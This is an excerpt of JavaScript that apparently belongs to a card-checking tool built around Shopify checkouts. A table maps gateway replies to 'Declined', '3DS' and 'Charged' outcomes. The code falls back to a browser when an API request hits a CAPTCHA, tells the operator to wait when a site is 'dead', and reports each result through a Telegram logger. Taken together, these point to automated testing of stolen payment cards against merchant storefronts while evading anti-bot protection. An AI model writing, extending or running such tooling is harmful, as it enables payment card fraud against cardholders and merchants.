...
const RESPONSE_CODES = {
    // Declined responses
    'CARD_DECLINED': { status: 'Declined', response: 'Card Declined' },
    'INSUFFICIENT_FUNDS': { status: 'Declined', response: 'Insufficient Funds' },
    'GENERIC_DECLINE': { status: 'Declined', response: 'Card Declined' },
    'DO_NOT_HONOR': { status: 'Declined', response: 'Do Not Honor' },
    'LOST_OR_STOLEN_CARD': { status: 'Declined', response: 'Lost/Stolen Card' },
    'EXPIRED_CARD': { status: 'Declined', response: 'Expired Card' },
    'INVALID_EXPIRY_DATE': { status: 'Declined', response: 'Invalid Expiry' },
    'INVALID_NUMBER': { status: 'Declined', response: 'Invalid Card Number' },
    'PROCESSING_ERROR': { status: 'Declined', response: 'Processing Error' },
    'CALL_ISSUER': { status: 'Declined', response: 'Call Issuer' },
    'PICK_UP_CARD': { status: 'Declined', response: 'Pick Up Card' },
    'TRY_AGAIN_LATER': { status: 'Declined', response: 'Try Again Later' },
    ...
    // 3DS/Authentication
    'CompletePaymentChallenge': { status: '3DS', response: '3D Secure Required' },
    'stripeAuthentications': { status: '3DS', response: 'Stripe 3DS Required' },
    'ACTION_REQUIRED': { status: '3DS', response: 'Authentication Required' },
    
    // Success
    'ProcessedReceipt': { status: 'Charged', response: 'Order Confirmed' },
    'thank_you': { status: 'Charged', response: 'Order Confirmed' },
    'SUCCESS': { status: 'Charged', response: 'Order Confirmed' },
    
    // Site issues
    'CAPTCHA_METADATA_MISSING': { status: 'Error', response: 'Site Dead (CAPTCHA) - Wait 40min' },
    'RATE_LIMITED': { status: 'Error', response: 'Rate Limited - Retry' }
};
...
class ShopifyCheckout {
    ...
    async run() {
        ...
        try {
            ...
            if (finalResult.needsCaptcha || finalResult.response?.includes('CAPTCHA')) {
                ...
                try {
                    ...
                    if (browserResult.status !== 'Error' || !browserResult.response?.includes('CAPTCHA')) {
                        finalResult = {
                        ...
                        console.log(`[BROWSER] ✓ Result: ${browserResult.status} - ${browserResult.response}`);
                    } else {
                        console.log(`[BROWSER] ✗ Browser also blocked: ${browserResult.response}`);
                        finalResult.needsBrowserFallback = true;
                    }
                } catch (browserError) {
                    console.log(`[BROWSER] ✗ Browser error: ${browserError.message}`);
                    finalResult.response = 'CAPTCHA Required - Both API and Browser methods blocked';
                    finalResult.needsBrowserFallback = true;
                }
            }
            
            // Check for 3DS/authentication requirement
            if (finalResult.response?.includes('3DS') || 
                finalResult.response?.includes('authentication') ||
                finalResult.response?.includes('CompletePaymentChallenge') ||
            ...
            this.result.response = finalResult.response || 'Unknown';
            this.result.orderId = finalResult.orderId || null;
            this.result.rawResponse = finalResult.rawResponse;
            
            await this.telegramLog(this.result.status.toLowerCase(), { response: this.result.response, rawResponse: this.result.rawResponse });
            ...
            if (parsed.status !== 'Unknown') {
                ...
                this.result.response = parsed.response;
            }
            
            await this.telegramLog('error', { response: error.message });
        }
